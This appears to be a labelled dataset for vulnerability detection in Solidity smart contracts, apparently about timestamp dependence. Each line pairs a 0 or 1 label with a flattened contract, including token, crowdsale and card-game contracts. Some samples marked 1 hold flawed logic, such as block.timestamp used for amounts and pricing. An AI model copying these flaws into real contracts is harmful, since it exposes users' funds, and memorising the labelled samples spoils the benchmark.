1<CODESPLIT>contract EcroContract {    address public owner;    modifier onlyOwner() {        require(msg.sender == owner);        _;    }    function withdrawInvestments() external onlyOwner returns (uint) {        uint amount = block.timestamp;        return amount;    }}
1<CODESPLIT>contract UniDAGCrowdsale {    uint256 public rateFirstRound = 4000;	uint256 public secondRoundTime = 1539129600;    function _getTokenAmount(uint256 _weiAmount) view internal returns (uint256) {        if(block.timestamp < secondRoundTime)            return _weiAmount * (rateFirstRound);    }}
0<CODESPLIT>contract Ownable {  address public owner;  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);     function Ownable() public {    owner = msg.sender;  }     modifier onlyOwner() {    require(msg.sender == owner);    _;  }     function transferOwnership(address newOwner) public onlyOwner {    require(newOwner != address(0));    OwnershipTransferred(owner, newOwner);    owner = newOwner;  }}
0<CODESPLIT>contract AccessAdmin is Ownable {     mapping (address => bool) adminContracts;     mapping (address => bool) actionContracts;  function setAdminContract(address _addr, bool _useful) public onlyOwner {    require(_addr != address(0));    adminContracts[_addr] = _useful;  }  modifier onlyAdmin {    require(adminContracts[msg.sender]);     _;  }  function setActionContract(address _actionAddr, bool _useful) public onlyAdmin {    actionContracts[_actionAddr] = _useful;  }  modifier onlyAccess() {    require(actionContracts[msg.sender]);    _;  }}interface ERC20 {    function totalSupply() public constant returns (uint);    function balanceOf(address tokenOwner) public constant returns (uint balance);    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);    function transfer(address to, uint tokens) public returns (bool success);    function approve(address spender, uint tokens) public returns (bool success);    function transferFrom(address from, address to, uint tokens) public returns (bool success);    event Transfer(address indexed from, address indexed to, uint tokens);    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);}
1<CODESPLIT>contract JadeCoin is ERC20, AccessAdmin {  using SafeMath for SafeMath;  string public constant name  = "MAGICACADEMY JADE";  string public constant symbol = "Jade";  uint8 public constant decimals = 0;  uint256 public roughSupply;  uint256 public totalJadeProduction;  uint256[] public totalJadeProductionSnapshots;         uint256 public nextSnapshotTime;  uint256 public researchDivPercent = 10;     mapping(address => uint256) public jadeBalance;  mapping(address => mapping(uint8 => uint256)) public coinBalance;  mapping(uint8 => uint256) totalEtherPool;      mapping(address => mapping(uint256 => uint256)) public jadeProductionSnapshots;     mapping(address => mapping(uint256 => bool)) private jadeProductionZeroedSnapshots;        mapping(address => uint256) public lastJadeSaveTime;    mapping(address => uint256) public lastJadeProductionUpdate;    mapping(address => uint256) private lastJadeResearchFundClaim;      mapping(address => uint256) private lastJadeDepositFundClaim;    uint256[] private allocatedJadeResearchSnapshots;       mapping(address => mapping(address => uint256)) private allowed;  event ReferalGain(address player, address referal, uint256 amount);     function JadeCoin() public {  }  function() external payable {    totalEtherPool[1] += msg.value;  }     function tweakDailyDividends(uint256 newResearchPercent) external {    require(msg.sender == owner);    require(newResearchPercent > 0 && newResearchPercent <= 10);            researchDivPercent = newResearchPercent;  }  function totalSupply() public constant returns(uint256) {    return roughSupply;    }     function balanceOf(address player) public constant returns(uint256) {    return SafeMath.add(jadeBalance[player],balanceOfUnclaimed(player));  }     function balanceOfUnclaimed(address player) public constant returns (uint256) {    uint256 lSave = lastJadeSaveTime[player];    if (lSave > 0 && lSave < block.timestamp) {       return SafeMath.mul(getJadeProduction(player),SafeMath.div(SafeMath.sub(block.timestamp,lSave),100));    }    return 0;  }     function getJadeProduction(address player) public constant returns (uint256){    return jadeProductionSnapshots[player][lastJadeProductionUpdate[player]];  }     function getTotalJadeProduction() external view returns (uint256) {    return totalJadeProduction;  }  function getlastJadeProductionUpdate(address player) public view returns (uint256) {    return lastJadeProductionUpdate[player];  }       function increasePlayersJadeProduction(address player, uint256 increase) public onlyAccess {    jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length] = SafeMath.add(getJadeProduction(player),increase);    lastJadeProductionUpdate[player] = allocatedJadeResearchSnapshots.length;    totalJadeProduction = SafeMath.add(totalJadeProduction,increase);  }     function reducePlayersJadeProduction(address player, uint256 decrease) public onlyAccess {    uint256 previousProduction = getJadeProduction(player);    uint256 newProduction = SafeMath.sub(previousProduction, decrease);    if (newProduction == 0) {       jadeProductionZeroedSnapshots[player][allocatedJadeResearchSnapshots.length] = true;      delete jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length];      } else {      jadeProductionSnapshots[player][allocatedJadeResearchSnapshots.length] = newProduction;    }       lastJadeProductionUpdate[player] = allocatedJadeResearchSnapshots.length;    totalJadeProduction = SafeMath.sub(totalJadeProduction,decrease);  }     function updatePlayersCoin(address player) internal {    uint256 coinGain = balanceOfUnclaimed(player);    lastJadeSaveTime[player] = block.timestamp;    roughSupply = SafeMath.add(roughSupply,coinGain);      jadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);    }     function updatePlayersCoinByOut(address player) external onlyAccess {    uint256 coinGain = balanceOfUnclaimed(player);    lastJadeSaveTime[player] = block.timestamp;    roughSupply = SafeMath.add(roughSupply,coinGain);      jadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);    }     function transfer(address recipient, uint256 amount) public returns (bool) {    updatePlayersCoin(msg.sender);    require(amount <= jadeBalance[msg.sender]);    jadeBalance[msg.sender] = SafeMath.sub(jadeBalance[msg.sender],amount);    jadeBalance[recipient] = SafeMath.add(jadeBalance[recipient],amount);         Transfer(msg.sender, recipient, amount);    return true;  }     function transferFrom(address player, address recipient, uint256 amount) public returns (bool) {    updatePlayersCoin(player);    require(amount <= allowed[player][msg.sender] && amount <= jadeBalance[player]);            jadeBalance[player] = SafeMath.sub(jadeBalance[player],amount);     jadeBalance[recipient] = SafeMath.add(jadeBalance[recipient],amount);     allowed[player][msg.sender] = SafeMath.sub(allowed[player][msg.sender],amount);             Transfer(player, recipient, amount);      return true;  }    function approve(address approvee, uint256 amount) public returns (bool) {    allowed[msg.sender][approvee] = amount;      Approval(msg.sender, approvee, amount);    return true;  }    function allowance(address player, address approvee) public constant returns(uint256) {    return allowed[player][approvee];    }       function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public onlyAccess {    uint256 unclaimedJade = balanceOfUnclaimed(player);            if (purchaseCost > unclaimedJade) {      uint256 jadeDecrease = SafeMath.sub(purchaseCost, unclaimedJade);      require(jadeBalance[player] >= jadeDecrease);      roughSupply = SafeMath.sub(roughSupply,jadeDecrease);      jadeBalance[player] = SafeMath.sub(jadeBalance[player],jadeDecrease);    } else {      uint256 jadeGain = SafeMath.sub(unclaimedJade,purchaseCost);      roughSupply = SafeMath.add(roughSupply,jadeGain);      jadeBalance[player] = SafeMath.add(jadeBalance[player],jadeGain);    }            lastJadeSaveTime[player] = block.timestamp;  }  function JadeCoinMining(address _addr, uint256 _amount) external onlyAdmin {    roughSupply = SafeMath.add(roughSupply,_amount);    jadeBalance[_addr] = SafeMath.add(jadeBalance[_addr],_amount);  }  function setRoughSupply(uint256 iroughSupply) external onlyAccess {    roughSupply = SafeMath.add(roughSupply,iroughSupply);  }     function coinBalanceOf(address player,uint8 itype) external constant returns(uint256) {    return coinBalance[player][itype];  }  function setJadeCoin(address player, uint256 coin, bool iflag) external onlyAccess {    if (iflag) {      jadeBalance[player] = SafeMath.add(jadeBalance[player],coin);    } else if (!iflag) {      jadeBalance[player] = SafeMath.sub(jadeBalance[player],coin);    }  }    function setCoinBalance(address player, uint256 eth, uint8 itype, bool iflag) external onlyAccess {    if (iflag) {      coinBalance[player][itype] = SafeMath.add(coinBalance[player][itype],eth);    } else if (!iflag) {      coinBalance[player][itype] = SafeMath.sub(coinBalance[player][itype],eth);    }  }  function setLastJadeSaveTime(address player) external onlyAccess {    lastJadeSaveTime[player] = block.timestamp;  }  function setTotalEtherPool(uint256 inEth, uint8 itype, bool iflag) external onlyAccess {    if (iflag) {      totalEtherPool[itype] = SafeMath.add(totalEtherPool[itype],inEth);     } else if (!iflag) {      totalEtherPool[itype] = SafeMath.sub(totalEtherPool[itype],inEth);    }  }  function getTotalEtherPool(uint8 itype) external view returns (uint256) {    return totalEtherPool[itype];  }  function setJadeCoinZero(address player) external onlyAccess {    jadeBalance[player]=0;  }  function getNextSnapshotTime() external view returns(uint256) {    return nextSnapshotTime;  }       function viewUnclaimedResearchDividends() external constant returns (uint256, uint256, uint256) {    uint256 startSnapshot = lastJadeResearchFundClaim[msg.sender];    uint256 latestSnapshot = allocatedJadeResearchSnapshots.length - 1;              uint256 researchShare;    uint256 previousProduction = jadeProductionSnapshots[msg.sender][lastJadeResearchFundClaim[msg.sender] - 1];      for (uint256 i = startSnapshot; i <= latestSnapshot; i++) {                uint256 productionDuringSnapshot = jadeProductionSnapshots[msg.sender][i];      bool soldAllProduction = jadeProductionZeroedSnapshots[msg.sender][i];      if (productionDuringSnapshot == 0 && !soldAllProduction) {        productionDuringSnapshot = previousProduction;      } else {        previousProduction = productionDuringSnapshot;    }                  researchShare += (allocatedJadeResearchSnapshots[i] * productionDuringSnapshot) / totalJadeProductionSnapshots[i];    }    return (researchShare, startSnapshot, latestSnapshot);  }        function claimResearchDividends(address referer, uint256 startSnapshot, uint256 endSnapShot) external {    require(startSnapshot <= endSnapShot);    require(startSnapshot >= lastJadeResearchFundClaim[msg.sender]);    require(endSnapShot < allocatedJadeResearchSnapshots.length);            uint256 researchShare;    uint256 previousProduction = jadeProductionSnapshots[msg.sender][lastJadeResearchFundClaim[msg.sender] - 1];      for (uint256 i = startSnapshot; i <= endSnapShot; i++) {                       uint256 productionDuringSnapshot = jadeProductionSnapshots[msg.sender][i];      bool soldAllProduction = jadeProductionZeroedSnapshots[msg.sender][i];      if (productionDuringSnapshot == 0 && !soldAllProduction) {        productionDuringSnapshot = previousProduction;      } else {        previousProduction = productionDuringSnapshot;      }                  researchShare += (allocatedJadeResearchSnapshots[i] * productionDuringSnapshot) / totalJadeProductionSnapshots[i];      }                    if (jadeProductionSnapshots[msg.sender][endSnapShot] == 0 && !jadeProductionZeroedSnapshots[msg.sender][endSnapShot] && previousProduction > 0) {      jadeProductionSnapshots[msg.sender][endSnapShot] = previousProduction;      }            lastJadeResearchFundClaim[msg.sender] = endSnapShot + 1;            uint256 referalDivs;    if (referer != address(0) && referer != msg.sender) {      referalDivs = researchShare / 100;        coinBalance[referer][1] += referalDivs;      ReferalGain(referer, msg.sender, referalDivs);    }    coinBalance[msg.sender][1] += SafeMath.sub(researchShare,referalDivs);  }             function snapshotDailyGooResearchFunding() external onlyAdmin {    uint256 todaysGooResearchFund = (totalEtherPool[1] * researchDivPercent) / 100;      totalEtherPool[1] -= todaysGooResearchFund;            totalJadeProductionSnapshots.push(totalJadeProduction);    allocatedJadeResearchSnapshots.push(todaysGooResearchFund);    nextSnapshotTime = block.timestamp + 24 hours;  }}interface GameConfigInterface {  function productionCardIdRange() external constant returns (uint256, uint256);  function battleCardIdRange() external constant returns (uint256, uint256);  function upgradeIdRange() external constant returns (uint256, uint256);  function unitCoinProduction(uint256 cardId) external constant returns (uint256);  function unitAttack(uint256 cardId) external constant returns (uint256);  function unitDefense(uint256 cardId) external constant returns (uint256);  function unitStealingCapacity(uint256 cardId) external constant returns (uint256);}
0<CODESPLIT>contract CardsBase is JadeCoin {  function CardsBase() public {    setAdminContract(msg.sender,true);    setActionContract(msg.sender,true);  }     struct Player {    address owneraddress;  }  Player[] players;  bool gameStarted;    GameConfigInterface public schema;     mapping(address => mapping(uint256 => uint256)) public unitsOwned;     mapping(address => mapping(uint256 => uint256)) public upgradesOwned;     mapping(address => uint256) public uintsOwnerCount;    mapping(address=> mapping(uint256 => uint256)) public uintProduction;        mapping(address => mapping(uint256 => uint256)) public unitCoinProductionIncreases;    mapping(address => mapping(uint256 => uint256)) public unitCoinProductionMultiplier;    mapping(address => mapping(uint256 => uint256)) public unitAttackIncreases;  mapping(address => mapping(uint256 => uint256)) public unitAttackMultiplier;  mapping(address => mapping(uint256 => uint256)) public unitDefenseIncreases;  mapping(address => mapping(uint256 => uint256)) public unitDefenseMultiplier;  mapping(address => mapping(uint256 => uint256)) public unitJadeStealingIncreases;  mapping(address => mapping(uint256 => uint256)) public unitJadeStealingMultiplier;  mapping(address => mapping(uint256 => uint256)) private unitMaxCap;       function setConfigAddress(address _address) external onlyOwner {    schema = GameConfigInterface(_address);  }   function beginGame(uint256 firstDivsTime) external payable onlyOwner {    require(!gameStarted);    gameStarted = true;    nextSnapshotTime = firstDivsTime;    totalEtherPool[1] = msg.value;     }  function endGame() external payable onlyOwner {    require(gameStarted);    gameStarted = false;  }  function getGameStarted() external constant returns (bool) {    return gameStarted;  }  function AddPlayers(address _address) external onlyAccess {     Player memory _player= Player({      owneraddress: _address    });    players.push(_player);  }        function getRanking() external view returns (address[], uint256[],uint256[]) {    uint256 len = players.length;    uint256[] memory arr = new uint256[](len);    address[] memory arr_addr = new address[](len);    uint256[] memory arr_def = new uint256[](len);      uint counter =0;    for (uint k=0;k<len; k++){      arr[counter] =  getJadeProduction(players[k].owneraddress);      arr_addr[counter] = players[k].owneraddress;      (,arr_def[counter],,) = getPlayersBattleStats(players[k].owneraddress);      counter++;    }    for(uint i=0;i<len-1;i++) {      for(uint j=0;j<len-i-1;j++) {        if(arr[j]<arr[j+1]) {          uint256 temp = arr[j];          address temp_addr = arr_addr[j];          uint256 temp_def = arr_def[j];          arr[j] = arr[j+1];          arr[j+1] = temp;          arr_addr[j] = arr_addr[j+1];          arr_addr[j+1] = temp_addr;          arr_def[j] = arr_def[j+1];          arr_def[j+1] = temp_def;        }      }    }    return (arr_addr,arr,arr_def);  }     function getTotalUsers()  external view returns (uint256) {    return players.length;  }  function getMaxCap(address _addr,uint256 _cardId) external view returns (uint256) {    return unitMaxCap[_addr][_cardId];  }     function getUnitsProduction(address player, uint256 unitId, uint256 amount) external constant returns (uint256) {    return (amount * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]) * (10 + unitCoinProductionMultiplier[player][unitId]));   }      function getUnitsInProduction(address player, uint256 unitId, uint256 amount) external constant returns (uint256) {    return SafeMath.div(SafeMath.mul(amount,uintProduction[player][unitId]),unitsOwned[player][unitId]);  }      function getUnitsAttack(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {    return (amount * (schema.unitAttack(unitId) + unitAttackIncreases[player][unitId]) * (10 + unitAttackMultiplier[player][unitId])) / 10;  }     function getUnitsDefense(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {    return (amount * (schema.unitDefense(unitId) + unitDefenseIncreases[player][unitId]) * (10 + unitDefenseMultiplier[player][unitId])) / 10;  }     function getUnitsStealingCapacity(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {    return (amount * (schema.unitStealingCapacity(unitId) + unitJadeStealingIncreases[player][unitId]) * (10 + unitJadeStealingMultiplier[player][unitId])) / 10;  }      function getPlayersBattleStats(address player) public constant returns (    uint256 attackingPower,     uint256 defendingPower,     uint256 stealingPower,    uint256 battlePower) {    uint256 startId;    uint256 endId;    (startId, endId) = schema.battleCardIdRange();         while (startId <= endId) {      attackingPower = SafeMath.add(attackingPower,getUnitsAttack(player, startId, unitsOwned[player][startId]));      stealingPower = SafeMath.add(stealingPower,getUnitsStealingCapacity(player, startId, unitsOwned[player][startId]));      defendingPower = SafeMath.add(defendingPower,getUnitsDefense(player, startId, unitsOwned[player][startId]));      battlePower = SafeMath.add(attackingPower,defendingPower);       startId++;    }  }     function getOwnedCount(address player, uint256 cardId) external view returns (uint256) {    return unitsOwned[player][cardId];  }  function setOwnedCount(address player, uint256 cardId, uint256 amount, bool iflag) external onlyAccess {    if (iflag) {      unitsOwned[player][cardId] = SafeMath.add(unitsOwned[player][cardId],amount);     } else if (!iflag) {      unitsOwned[player][cardId] = SafeMath.sub(unitsOwned[player][cardId],amount);    }  }     function getUpgradesOwned(address player, uint256 upgradeId) external view returns (uint256) {    return upgradesOwned[player][upgradeId];  }     function setUpgradesOwned(address player, uint256 upgradeId) external onlyAccess {    upgradesOwned[player][upgradeId] = SafeMath.add(upgradesOwned[player][upgradeId],1);  }  function getUintsOwnerCount(address _address) external view returns (uint256) {    return uintsOwnerCount[_address];  }  function setUintsOwnerCount(address _address, uint256 amount, bool iflag) external onlyAccess {    if (iflag) {      uintsOwnerCount[_address] = SafeMath.add(uintsOwnerCount[_address],amount);    } else if (!iflag) {      uintsOwnerCount[_address] = SafeMath.sub(uintsOwnerCount[_address],amount);    }  }  function getUnitCoinProductionIncreases(address _address, uint256 cardId) external view returns (uint256) {    return unitCoinProductionIncreases[_address][cardId];  }  function setUnitCoinProductionIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitCoinProductionIncreases[_address][cardId] = SafeMath.add(unitCoinProductionIncreases[_address][cardId],iValue);    } else if (!iflag) {      unitCoinProductionIncreases[_address][cardId] = SafeMath.sub(unitCoinProductionIncreases[_address][cardId],iValue);    }  }  function getUnitCoinProductionMultiplier(address _address, uint256 cardId) external view returns (uint256) {    return unitCoinProductionMultiplier[_address][cardId];  }  function setUnitCoinProductionMultiplier(address _address, uint256 cardId, uint256 iValue, bool iflag) external onlyAccess {    if (iflag) {      unitCoinProductionMultiplier[_address][cardId] = SafeMath.add(unitCoinProductionMultiplier[_address][cardId],iValue);    } else if (!iflag) {      unitCoinProductionMultiplier[_address][cardId] = SafeMath.sub(unitCoinProductionMultiplier[_address][cardId],iValue);    }  }  function setUnitAttackIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitAttackIncreases[_address][cardId] = SafeMath.add(unitAttackIncreases[_address][cardId],iValue);    } else if (!iflag) {      unitAttackIncreases[_address][cardId] = SafeMath.sub(unitAttackIncreases[_address][cardId],iValue);    }  }  function getUnitAttackIncreases(address _address, uint256 cardId) external view returns (uint256) {    return unitAttackIncreases[_address][cardId];  }   function setUnitAttackMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitAttackMultiplier[_address][cardId] = SafeMath.add(unitAttackMultiplier[_address][cardId],iValue);    } else if (!iflag) {      unitAttackMultiplier[_address][cardId] = SafeMath.sub(unitAttackMultiplier[_address][cardId],iValue);    }  }  function getUnitAttackMultiplier(address _address, uint256 cardId) external view returns (uint256) {    return unitAttackMultiplier[_address][cardId];  }   function setUnitDefenseIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitDefenseIncreases[_address][cardId] = SafeMath.add(unitDefenseIncreases[_address][cardId],iValue);    } else if (!iflag) {      unitDefenseIncreases[_address][cardId] = SafeMath.sub(unitDefenseIncreases[_address][cardId],iValue);    }  }  function getUnitDefenseIncreases(address _address, uint256 cardId) external view returns (uint256) {    return unitDefenseIncreases[_address][cardId];  }  function setunitDefenseMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitDefenseMultiplier[_address][cardId] = SafeMath.add(unitDefenseMultiplier[_address][cardId],iValue);    } else if (!iflag) {      unitDefenseMultiplier[_address][cardId] = SafeMath.sub(unitDefenseMultiplier[_address][cardId],iValue);    }  }  function getUnitDefenseMultiplier(address _address, uint256 cardId) external view returns (uint256) {    return unitDefenseMultiplier[_address][cardId];  }  function setUnitJadeStealingIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitJadeStealingIncreases[_address][cardId] = SafeMath.add(unitJadeStealingIncreases[_address][cardId],iValue);    } else if (!iflag) {      unitJadeStealingIncreases[_address][cardId] = SafeMath.sub(unitJadeStealingIncreases[_address][cardId],iValue);    }  }  function getUnitJadeStealingIncreases(address _address, uint256 cardId) external view returns (uint256) {    return unitJadeStealingIncreases[_address][cardId];  }   function setUnitJadeStealingMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {    if (iflag) {      unitJadeStealingMultiplier[_address][cardId] = SafeMath.add(unitJadeStealingMultiplier[_address][cardId],iValue);    } else if (!iflag) {      unitJadeStealingMultiplier[_address][cardId] = SafeMath.sub(unitJadeStealingMultiplier[_address][cardId],iValue);    }  }  function getUnitJadeStealingMultiplier(address _address, uint256 cardId) external view returns (uint256) {    return unitJadeStealingMultiplier[_address][cardId];  }   function setUintCoinProduction(address _address, uint256 cardId, uint256 iValue, bool iflag) external onlyAccess {    if (iflag) {      uintProduction[_address][cardId] = SafeMath.add(uintProduction[_address][cardId],iValue);     } else if (!iflag) {      uintProduction[_address][cardId] = SafeMath.sub(uintProduction[_address][cardId],iValue);    }  }  function getUintCoinProduction(address _address, uint256 cardId) external view returns (uint256) {    return uintProduction[_address][cardId];  }  function upgradeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external onlyAccess {    uint256 productionGain;    if (upgradeClass == 0) {      unitCoinProductionIncreases[player][unitId] += upgradeValue;      productionGain = unitsOwned[player][unitId] * upgradeValue * (10 + unitCoinProductionMultiplier[player][unitId]);      increasePlayersJadeProduction(player, productionGain);    } else if (upgradeClass == 1) {      unitCoinProductionMultiplier[player][unitId] += upgradeValue;      productionGain = unitsOwned[player][unitId] * upgradeValue * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]);      increasePlayersJadeProduction(player, productionGain);    } else if (upgradeClass == 2) {      unitAttackIncreases[player][unitId] += upgradeValue;    } else if (upgradeClass == 3) {      unitAttackMultiplier[player][unitId] += upgradeValue;    } else if (upgradeClass == 4) {      unitDefenseIncreases[player][unitId] += upgradeValue;    } else if (upgradeClass == 5) {      unitDefenseMultiplier[player][unitId] += upgradeValue;    } else if (upgradeClass == 6) {      unitJadeStealingIncreases[player][unitId] += upgradeValue;    } else if (upgradeClass == 7) {      unitJadeStealingMultiplier[player][unitId] += upgradeValue;    } else if (upgradeClass == 8) {      unitMaxCap[player][unitId] = upgradeValue;      }  }      function removeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external onlyAccess {    uint256 productionLoss;    if (upgradeClass == 0) {      unitCoinProductionIncreases[player][unitId] -= upgradeValue;      productionLoss = unitsOwned[player][unitId] * upgradeValue * (10 + unitCoinProductionMultiplier[player][unitId]);      reducePlayersJadeProduction(player, productionLoss);    } else if (upgradeClass == 1) {      unitCoinProductionMultiplier[player][unitId] -= upgradeValue;      productionLoss = unitsOwned[player][unitId] * upgradeValue * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]);      reducePlayersJadeProduction(player, productionLoss);    } else if (upgradeClass == 2) {      unitAttackIncreases[player][unitId] -= upgradeValue;    } else if (upgradeClass == 3) {      unitAttackMultiplier[player][unitId] -= upgradeValue;    } else if (upgradeClass == 4) {      unitDefenseIncreases[player][unitId] -= upgradeValue;    } else if (upgradeClass == 5) {      unitDefenseMultiplier[player][unitId] -= upgradeValue;    } else if (upgradeClass == 6) {      unitJadeStealingIncreases[player][unitId] -= upgradeValue;    } else if (upgradeClass == 7) {      unitJadeStealingMultiplier[player][unitId] -= upgradeValue;    }  }}library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {         uint256 c = a / b;         return c;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}
0<CODESPLIT>contract ERC20Basic {  uint256 public totalSupply;  function balanceOf(address who) public constant returns (uint256);  function transfer(address to, uint256 value) public returns (bool);  event Transfer(address indexed from, address indexed to, uint256 value);}  
0<CODESPLIT>contract SafeMath {  function safeMul(uint a, uint b) internal returns (uint) {    uint c = a * b;    assert(a == 0 || c / a == b);    return c;  }  function safeDiv(uint a, uint b) internal returns (uint) {    assert(b > 0);    uint c = a / b;    assert(a == b * c + a % b);    return c;  }  function safeSub(uint a, uint b) internal returns (uint) {    assert(b <= a);    return a - b;  }  function safeAdd(uint a, uint b) internal returns (uint) {    uint c = a + b;    assert(c>=a && c>=b);    return c;  }  function max64(uint64 a, uint64 b) internal constant returns (uint64) {    return a >= b ? a : b;  }  function min64(uint64 a, uint64 b) internal constant returns (uint64) {    return a < b ? a : b;  }  function max256(uint256 a, uint256 b) internal constant returns (uint256) {    return a >= b ? a : b;  }  function min256(uint256 a, uint256 b) internal constant returns (uint256) {    return a < b ? a : b;  }} 
0<CODESPLIT>contract Haltable is Ownable {  bool public halted;  modifier stopInEmergency {    if (halted) throw;    _;  }  modifier stopNonOwnersInEmergency {    if (halted && msg.sender != owner) throw;    _;  }  modifier onlyInEmergency {    if (!halted) throw;    _;  }     function halt() external onlyOwner {    halted = true;  }     function unhalt() external onlyOwner onlyInEmergency {    halted = false;  }}  
0<CODESPLIT>contract PricingStrategy {  address public tier;     function isPricingStrategy() public constant returns (bool) {    return true;  }     function isSane(address crowdsale) public constant returns (bool) {    return true;  }     function isPresalePurchase(address purchaser) public constant returns (bool) {    return false;  }     function updateRate(uint newOneTokenInWei) public;     function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);}  
0<CODESPLIT>contract FinalizeAgent {  bool public reservedTokensAreDistributed = false;  function isFinalizeAgent() public constant returns(bool) {    return true;  }     function isSane() public constant returns (bool);  function distributeReservedTokens(uint reservedTokensDistributionBatch);     function finalizeCrowdsale();}  
0<CODESPLIT>contract ERC20 is ERC20Basic {  function allowance(address owner, address spender) public constant returns (uint256);  function transferFrom(address from, address to, uint256 value) public returns (bool);  function approve(address spender, uint256 value) public returns (bool);  event Approval(address indexed owner, address indexed spender, uint256 value);} 
0<CODESPLIT>contract FractionalERC20Ext is ERC20 {  uint public decimals;  uint public minCap;} 
1<CODESPLIT>contract CrowdsaleExt is Haltable {     uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;  using SafeMathLibExt for uint;     FractionalERC20Ext public token;     PricingStrategy public pricingStrategy;     FinalizeAgent public finalizeAgent;     string public name;     address public multisigWallet;     uint public minimumFundingGoal;     uint public startsAt;     uint public endsAt;     uint public tokensSold = 0;     uint public weiRaised = 0;     uint public investorCount = 0;     bool public finalized;  bool public isWhiteListed;  address[] public joinedCrowdsales;  uint8 public joinedCrowdsalesLen = 0;  uint8 public joinedCrowdsalesLenMax = 50;  struct JoinedCrowdsaleStatus {    bool isJoined;    uint8 position;  }  mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;     mapping (address => uint256) public investedAmountOf;     mapping (address => uint256) public tokenAmountOf;  struct WhiteListData {    bool status;    uint minCap;    uint maxCap;  }     bool public isUpdatable;     mapping (address => WhiteListData) public earlyParticipantWhitelist;     address[] public whitelistedParticipants;     uint public ownerTestValue;     enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}     event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);     event Whitelisted(address addr, bool status, uint minCap, uint maxCap);  event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);     event StartsAtChanged(uint newStartsAt);     event EndsAtChanged(uint newEndsAt);  function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {    owner = msg.sender;    name = _name;    token = FractionalERC20Ext(_token);    setPricingStrategy(_pricingStrategy);    multisigWallet = _multisigWallet;    if(multisigWallet == 0) {        throw;    }    if(_start == 0) {        throw;    }    startsAt = _start;    if(_end == 0) {        throw;    }    endsAt = _end;         if(startsAt >= endsAt) {        throw;    }         minimumFundingGoal = _minimumFundingGoal;    isUpdatable = _isUpdatable;    isWhiteListed = _isWhiteListed;  }     function() payable {    throw;  }     function investInternal(address receiver, uint128 customerId) stopInEmergency private {         if(getState() == State.PreFunding) {             throw;    } else if(getState() == State.Funding) {                    if(isWhiteListed) {        if(!earlyParticipantWhitelist[receiver].status) {          throw;        }      }    } else {             throw;    }    uint weiAmount = msg.value;         uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());    if(tokenAmount == 0) {             throw;    }    if(isWhiteListed) {      if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {                 throw;      }             if (isBreakingInvestorCap(receiver, tokenAmount)) {        throw;      }      updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);    } else {      if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {        throw;      }    }    if(investedAmountOf[receiver] == 0) {               investorCount++;    }         investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);         weiRaised = weiRaised.plus(weiAmount);    tokensSold = tokensSold.plus(tokenAmount);         if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {      throw;    }    assignTokens(receiver, tokenAmount);         if(!multisigWallet.send(weiAmount)) throw;         Invested(receiver, weiAmount, tokenAmount, customerId);  }     function invest(address addr) public payable {    investInternal(addr, 0);  }     function buy() public payable {    invest(msg.sender);  }  function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {         if(finalized) {      throw;    }         if(address(finalizeAgent) != address(0)) {      finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);    }  }  function areReservedTokensDistributed() public constant returns (bool) {    return finalizeAgent.reservedTokensAreDistributed();  }  function canDistributeReservedTokens() public constant returns(bool) {    CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());    if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;    return false;  }     function finalize() public inState(State.Success) onlyOwner stopInEmergency {         if(finalized) {      throw;    }         